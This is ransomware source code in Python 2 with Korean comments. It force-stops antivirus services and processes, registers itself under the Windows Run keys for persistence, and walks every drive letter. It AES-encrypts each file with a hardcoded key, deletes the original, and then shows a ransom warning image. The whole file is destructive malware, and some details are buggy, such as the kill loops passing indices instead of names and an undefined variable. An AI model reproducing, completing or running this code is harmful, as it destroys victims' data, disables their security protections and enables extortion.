#-*- coding: utf-8 -*-
import os, threading, Crypto, hashlib, time
import Crypto.Random
from Crypto.Cipher import AES
from _winreg import *

KillServiceList=["Windows Defender Service", "ALYac RealTime Service", "V3 Service", "V3 Lite Service", "avast! Antivirus"] # 백신 서비스 리스트
KillProcessList=["AYAgent.aye", "V3Svc.exe", "V3LSvc.exe", "asdsvc.exe", "V3Lite.exe", "AvastSVC.exe", "NaverAgent.exe", "Nsavsvc.npc", "NVCAgent.npc", "NVC.npc"] # 백신 프로세스 리스트
VirusFile="C:\\Windows\\Decorate.exe" # 랜섬웨어 프로그램
InfectionImageFile="C:\\Windows\\Warning.png" # 랜섬웨어 감염 이미지 파일
InfectionImageFile2="C:\\Users\\Public\\Desktop\\Warning.png"
RegName="Decorate" # 시작 레지스트리에 등록할 이름
SearchDrive=["C:\\", "D:\\", "E:\\", "F:\\", "G:\\", "H:\\", "I:\\", "J:\\", "K:\\", "L:\\", "M:\\", "N:\\", "A:\\", "B:\\", "O:\\", "P:\\", "Q:\\", "R:\\", "S:\\", "T:\\", "U:\\", "V:\\", "W:\\", "X:\\", "Y:\\", "Z:\\"] # 암호화 진행할 드라이브 리스트
ExceptDirectoryList=["C:\\Windows", "C:\\Program Files\\Common Files"] # 암호화 하지 않을 디렉터리 리스트로 하위 디렉터리 포함(현재 C드라이브에 윈도우가 설치돼 있다고 가정)
ExceptFileList=[VirusFile, InfectionImageFile, InfectionImageFile2] # 암호화 하지 않을 파일 리스트
FileNameExtension="[RansomWare@Hack.ABC].java" # 감염 확장자
key="ug3vdm7pa2jxt5hyb0qlc6zk1iwf9sn8eor4" # 암호화에 사용될 키 값
InitializationVector="f8u5qh9v0gl6w1j3" # 초기화 벡터로 CBC(Cipher Block Chaining) Mode로 암호화 하므로 초기화 벡터는 16Byte가 되야함
sem=threading.Semaphore(10) # 세마포어 설정

def gen_sha256_hashed_key_salt(key): # SHA(256) 해시 함수
    salt1=hashlib.sha256(key).digest() # 설정한 Key를 해싱해 솔트 값 생성
    return hashlib.sha256(salt1+key).digest() # 생성한 솔트 값과 설정한 Key를 합해 해싱

def AES256Encrypt(key, plain): # AES 암호화 방식으로 256Byte Key를 사용하여 암호화 하는 함수
    length=AES.block_size-(len(plain)%AES.block_size) # 각 블록을 16Byte 로 맞춰줘야 하므로 마지막 블록이 16Byte 가 아닐 경우 부족한 바이트 수를 구해서
    plain+=chr(length)*length # 부족한 바이트 수만큼 더해서 마지막 블록을 16Byte 로 맞춤
    iv=InitializationVector # 초기화 벡터 설정
    encryptor=AES.new(gen_sha256_hashed_key_salt(key), AES.MODE_CBC, IV=iv) # SHA(256) 해시 함수로 메세지 다이제스트 생성, 블록 암호화 방식 중 하나인 CBC(Cipher Block Chaining) 사용 
    return {'cipher': encryptor.encrypt(plain), 'iv': iv} # 암호화 후 값 반환

def EncryptFunc(File): # 함호화 함수
    try:
        sem.acquire() # 임계영역 생성
        fp=open(File, "rb") # 파일을 열여서 평문(원본 프로그램의 바이너리)을 얻음
        FileBinary=fp.read()
        fp.close()
        encrypted=AES256Encrypt(key, FileBinary) # 키 값을 이용해 바이너리를 암호화
        fp=open(File+"."+FileNameExtension, "wb") # 새로운 파일(감염된 파일)을 만들어서 암호문(암호화된 바이너리)을 덮음
        fp.write(encrypted['cipher'])
        fp.close()
        os.system("del /q \""+File+"\"") # 원본 파일 삭제
        sem.release() # 임계영역 해제
    except Exception, e:
        pass

def RecursiveFunc(Directory): # 디렉터리 재귀 탐색 함수
    try:
        for MainDirectory, SubDirectories, Files in os.walk(Directory): # 디렉터리 탐색
            MainDirectoryName=MainDirectory # 메인 디렉터리
            DconValue=0 # 예외 디렉터리 확인 변수
            for ExceptDirectory in ExceptDirectoryList:
                if ExceptDirectory in MainDirectoryName: # 현재 탐색된 디렉터리가 예외 디렉터리 및 예외 디렉터리의 하위 디렉터리인 경우
                    DconValue=1 # 값 재설정
                    break
            if(DconValue==1): # 현재 탐색된 디렉터리가 예외 디렉터리 및 예외 디렉터리의 하위 디렉터리인 경우 탐색 생략
                continue
            for SubDirectory in SubDirectories: # 메인 디렉터리 내 서브 디렉터리들 탐색
                SubDirectoryName=MainDirectoryName+SubDirectory # 서브 디렉터리                    
                RecursiveFunc(SubDirectoryName) # 재귀 진입
                break
            for File in Files: # 메인&서브 디렉터리 내 파일들
                FileName=MainDirectoryName+"\\"+File # 암호화 할 파일
                if FileNameExtension in FileName: # 이미 암호화 돼 있을 경우
                    continue
                FconValue=0 # 예외 파일 확인 변수
                for ExceptFile in ExceptFileList:
                    if(FileName==ExceptFile): # 현재 탐색된 파일이 예외 파일인 경우
                        FconValue=1 # 값 재설정
                        break
                if(FconValue==1): # 현재 탐색된 파일이 예외 파일인 경우 암호화 생략
                    continue
                EncryptFunc(FileName) # 암호화
    except Exception, e:
        pass
                
def SearchFunc(): # 파일 탐색 함수
    try:
        threads=[]
        for Drive in SearchDrive: # 드라이브 차례로 탐색
            th=threading.Thread(target=RecursiveFunc, args=(Drive,)) # 스레드 세팅
            th.start() # 스레드 생성
            threads.append(th) # 생성된 스레드 저장
            if(len(threads) > 300): # 생성된 스레드의 수가 300개 초과일 경우
                for th in threads: 
                    th.join() # 스레드 종료 대기
                threads=[]
        for th in threads:
            th.join()    
    except Exception, e:
        pass

def RegistryFunc(): # 시작 레지스트리 등록 함수
    try:
        varSubKey1="SOFTWARE\WoW6432Node\Microsoft\Windows\CurrentVersion\Run"  # 서브 레지스트리 목록 지정(64비트 시작 레지스트리)
        varSubKey2="SOFTWARE\Microsoft\Windows\CurrentVersion\Run" # 32비트 시작 레지스트리
        varReg1=ConnectRegistry(None, HKEY_LOCAL_MACHINE) # 루트 레지스트리 핸들 객체 얻음
        varReg2=ConnectRegistry(None, HKEY_LOCAL_MACHINE)
        varKey1=OpenKey(varReg1, varSubKey1) # 레지스트리 핸들 객체 얻음
        varKey2=OpenKey(varReg2, varSubKey2)
        confirm=1 # 레지스트리 중복 확인 변수 초기값 설정 
        for i in range(30):
            try:
                name1, variable1, data1 = EnumValue(varKey1, i) # 레지스트리에 등록된 이름, 데이터형, 데이터 조회
                name2, variable2, data2 = EnumValue(varKey2, i)
                if(((RegName == name1) and (CurProg == variable1)) or ((RegName == name2) and (CurProg == variable2))): # 중복 등록을 막기 위한 루틴
                    confirm=0 # 중복 확인 변수 값 재설정
                    break
            except Exception, e:
                pass
        CloseKey(varKey1) # 레지스트리 핸들 닫음 
        CloseKey(varKey2)
        CloseKey(varReg1) # 레지스트리 닫음 
        CloseKey(varReg2)
        if(confirm==1): # 등록이 안 돼 있을 경우
            varReg1=ConnectRegistry(None, HKEY_LOCAL_MACHINE)
            varReg2=ConnectRegistry(None, HKEY_LOCAL_MACHINE)
            varKey1=OpenKey(varReg1, varSubKey1)
            varKey2=OpenKey(varReg2, varSubKey2)
            SetValueEx(varKey1, RegName, 0, REG_SZ, VirusFile) # 현재 프로그램 등록
            SetValueEx(varKey2, RegName, 0, REG_SZ, VirusFile)
            CloseKey(varKey1)
            CloseKey(varKey2)
            CloseKey(varReg1)
            CloseKey(varReg2)
    except Exception, e:
        pass

def KillFunc(): # 서비스&프로세스 종료 함수
    try:
        for serv in range(len(KillServiceList)):
            try:
                os.system("net stop "+"\""+serv+"\"") # 백신 서비스 종료
            except Exception, e:
                pass
        for prog in range(len(KillProcessList)):
            try:
                os.system("taskkill.exe /f /im "+"\""+prog+"\"") # 백신 프로세스 강제 종료
            except Exception, e:
                pass
    except Exception, e:
        pass    

def ShowImage(): # 감염 경고 메세지 띄우는 함수
    try:
        os.system(InfectionImageFile) # 감염 이미지 파일 실행
        os.system(InfectionImageFile2)
    except Exception, e:
        pass

def main():
    try:
        KillFunc() # 백신 강제종료
        RegistryFunc() # 시작 레지스트리 설정
        ShowImage() # 감염 경고 메세지 띄움
        SearchFunc() # 디렉터리 탐색 후 파일 암호화
        ShowImage() # 감염 경고 메세지 띄움
    except Exception, e:
        exit(0)

if __name__=="__main__":
    main()
